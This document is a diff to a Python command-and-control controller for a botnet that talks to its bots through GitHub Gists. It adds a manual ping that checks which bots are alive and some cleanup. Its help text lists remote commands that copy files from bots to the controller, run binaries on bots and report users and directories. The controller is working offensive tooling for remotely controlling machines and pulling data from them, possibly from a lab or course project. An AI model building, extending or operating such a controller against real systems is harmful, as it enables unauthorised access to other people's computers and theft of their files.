@@ -51,19 +51,23 @@ def reader():
             case "exit":
                 EXECUTE_CMDS.append(["exit"])
                 return
+            case "ping":
+                EXECUTE_CMDS.append(["ping"])
             case _:
                 print("usage: <command name> [bot name] [parameter1 ...]\n\n"
-                      "\tls_bots \t\t\t\t\t(lists all currently available bots)\n"
-                      "\texit  \t\t\t\t\t\t(stop controller)\n"
-                      "\tw  <bot filename> \t\t\t(lists users currently logged in)\n"
+                      "\tls_bots \t\t\t(lists all currently available bots)\n"
+                      "\texit  \t\t\t\t(stop controller)\n"
+                      "\tping  \t\t\t\t(ping all bots manually)\n"
+                      "\tw  <bot filename> \t\t(lists users currently logged in)\n"
                       "\tls <bot filename> <PATH> \t(list content of specified directory using ls -la)\n"
-                      "\tid <bot filename> \t\t\t(id of current user)\n"
+                      "\tid <bot filename> \t\t(id of current user)\n"
                       "\tcp <bot filename> <PATH> \t(copy fole from the bot to controller)\n"
                       "\texec <bot filename> <PATH> \t(execute a binary inside the bot given the name of the binary)\n")
 
 
 def executor():
     start = timer()
+    ping_ = False
     while True:
         if len(EXECUTE_CMDS) == 0:
             time.sleep(1)
@@ -108,12 +112,16 @@ def executor():
                         if gist.check_response(GIST_API, cmd[1]):
                             gist.print_response(GIST_API, cmd[1])
 
+                case "ping":
+                    ping_ = True
+
                 case _:
                     print("Unknown command" + cmd[0])
 
         # Check if the bots are alive every 5 minutes
-        if timer() - start > 300:  # TODO: 5 min = 300 s
+        if timer() - start > 300 or ping_:  # 300 s = 5 min
             # Reset bots
+            ping_ = False
             response_time = 15
             print("----- CHECKING ALIVE BOTS -----", file=sys.stderr)
             ping.send(GIST_API, BOT_LIST)
@@ -121,7 +129,7 @@ def executor():
             print("WAITING FOR BOTS TO RESPOND", file=sys.stderr, end="")
             for i in range(response_time, 0, -1):
                 time.sleep(1)
-                print(".", file=sys.stderr, end="")
+                print(".", file=sys.stderr, end="", flush=True)
 
             # Check if bots are alive -> remove dead
             print("\nREMOVING DEAD BOTS", file=sys.stderr)
@@ -155,5 +163,7 @@ executor_thread.start()
 reader_thread.join()
 executor_thread.join()
 
-# Cleanup helper folder (tmp directory)
+# Cleanup helper folder (tmp directory, copied if empty)
 os.rmdir('tmp')
+if len(os.listdir('copied')) == 0:
+    os.rmdir('copied')
